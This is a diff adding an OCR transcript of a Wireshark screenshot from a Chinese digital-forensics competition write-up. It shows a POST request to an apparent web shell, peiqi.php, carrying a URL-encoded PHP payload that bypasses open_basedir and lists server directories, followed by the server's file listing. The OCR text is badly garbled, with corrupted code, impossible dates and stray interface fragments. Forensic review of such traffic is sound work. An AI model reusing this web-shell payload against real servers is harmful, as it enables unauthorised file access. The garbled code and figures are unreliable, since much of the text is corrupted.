@@ -1,0 +1,87 @@
+# OCR: 8642fb3f928a72546f69ec8db1871786.jpg
+# 来源: ./02-WriteUp/2024/2024-电子取证比武-复盘/8642fb3f928a72546f69ec8db1871786.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:13
+
+Wireshark·源HTTP(tcp.stream.eq 114)·tcpdump_ficap
+POST/peiqi.php.HTTP/a.a Host:222.2.2.180
+Accept-Encoding:tip,deflste
+User-Agent:mezllia/5.e(uindpws.T.6.t:Msn54;:x64;ry:25.e)Gecko/2e1ee1iet:Flrefox/25.a Content-Typelapplicatfon/x-wmr-form-urlencoded
+Content-Length:1571 Connection:close
+o
+cebdc7ea2574c3uznLSd5oy93dsdyb290t3d3dysechiob3Auy29tw%30%308peiqiu%40int_set(%z2display_errors%22%2c%20%220%22)83u%4esettime_limit(e)%s8%24opdir%3D%4eini_get(%220pen_basedi
+pree_sp1it(%2252P%5C%5CWSC%SC37Ck5CK2PX2F%22%2C240pdi)38%24ocud%3DdirnaTe(%24_SERVEk%5Bk225CRIPT_FILENHEX2285D)X3Bx24tmdLr%3D%22.39dae
+-%22)%3BiF(24epdi)%2076%24oparrk30
+7%22%3B%48mkdir(%24tedsr)%3B%48chd1r(%24tid1r)%3B%48in1set(%220penbased1r%22%2c%22..%22)%3Bfor(%241%3De%3B%241%3Cst2eof(%24oparr)%38%241%28%2B)%7B%4echd1r(%22..%22)%3B%70%40 ind_set(%220pen
+n.basedir%22%2C%2zk2F%22)%38%40rmdir(%240cwd.%22%27%22.%24tmdir)%38%70%3Bfunction%2easenc(%24out)%7Breturn%20%240ut*38%70%38function%28as0utput()%70%24output%3Do
+_end_clean()x38echc620%22659%22.x22692%22%3Becho%20%4easenc(%240
+butput)83Becho82x22620036%22.x22df23ea22%38%70ob_stsrt()%38try/78%240%30bese64_decode(sub
+retcantentsCx38ol
+str(%24P0ST%5B%220ebdc7ea2574c3%22%50%2C2))%3B%24F%3D%4eopendtr(%24D)%3B1f(X24F%30%3DMULL)%7Becho(%22ERR0R%3A32F%2F%20Path%20Not%2eFound%200/%20No%28Permtssion!%22)%3B%7De1se%7m%2463DWULL33B%24L%30ULL%3Bwhile(%241%30%48readdir(%24F))%7%24P%3D%24D.%241%38%24T%3D%40date(%22Y-m-d%28H33A1%3As%22%2C%48filentime(%24P))%3B%4824E%3Dsubstr(baseconyert
+Fs(324P）%2C10%2C8）%2C-4)%38%248%30%22%09%22.%24T.%22%09%22540F11siTe(%24P）.%22%09%22.%24E.%2268A322538:F(%401s_dir（%24P)）%24附.X30%24N.%222F%22.%248%381s电328%24
+(X4oFs1eper
+X30%24N.324RX3B%7DechoX20%24.324L3B%48c105edlr(324F）%38%70%3B%7Dcatch(Exception%20%24e)87Bechok20%22ERRORX3A%2F%2F%22.%24e-3EgetMe5sage(）%3B%7D%3Basoutput()%3Bdie()%3BHTTP
+/1.12080k Serveri nginx
+Date:Frl,04har 202207:16:38 GMT Content-Typeitext/html, charset=UTE-8
+Transfer-Encoding:chunked Connection: close
+Varyt Accept-Encoding Content-Encoding:gzig
+659692.
+2022-83-84 15116:38 2822-83-8316:48:05
+4096 51
+applicatian
+2020-09-09 15:38:12
+2828-89-18 14:03:54
+backup/
+57
+extend) Enstali/
+2028-89-09 15:38:12 2822-03-03 17:03:47
+phplyAdmin/2828-89-8915:38:38
+2820-09-09 15138:34
+plugins/
+publicl runtine template/ thinkphp/ vendor/ suser.ini 404.html busidpath-gitignore Chtaccess-project buiid.php
+2828-89-89 16:43:46 2822-83-83
+816:56:51
+2826-89-89
+915:48:36
+2828-89-09 15:41:06 2820-89-09 15:41:44 2822-03-03 16:48:05 2822-03-3
+16:48:05 15:37:56
+2828
+-89-89
+15:37156
+2828-89-09
+2022-02-2415:14:46 2828-89-89 15:37:58 2820-89-89 15:3812
+oser.sor
+ico2828-09-89
+favice
+hgzb.ttf index.html Endex.php-phg
+168 4896
+324 235
+479 净品需。 689 1124
+2020-09-09 15:58:12 15:38:12
+1150
+15:38112
+2828-89-89
+2020-09-09 15:38:12 2828-89-09 15:38:12 2028-89-09 15:38:12
+LictnsEtxt2820-e9-e915:38:12 nginx.cont2820-e9-0015:38:12 ng1nx.cont22020-09-0915138:12 nginx.conf32828-89-8915:38:12
+1653632 26e3 21201 1854 1238 2685 1544
+2022-02-24 15:14:46
+nginx.htaccess
+phpinfo.php2020-09-0915:38:12
+23 5904
+REA0nE.md2e26-e9-e915:39:80
+为组59641有户#分#1提特带分1m击通
+型个对话（3492bytes）直找
+8755
+8755 8755 海#游  8755 0544
+e755 0755 8755 0755 8755 0755
+0755 8755 8755
+8755 e755 8755
+Show data asUTF-8
+湖源此
+打印
+另存为
+返面
+关阁
+x
+德14旦国下一个动
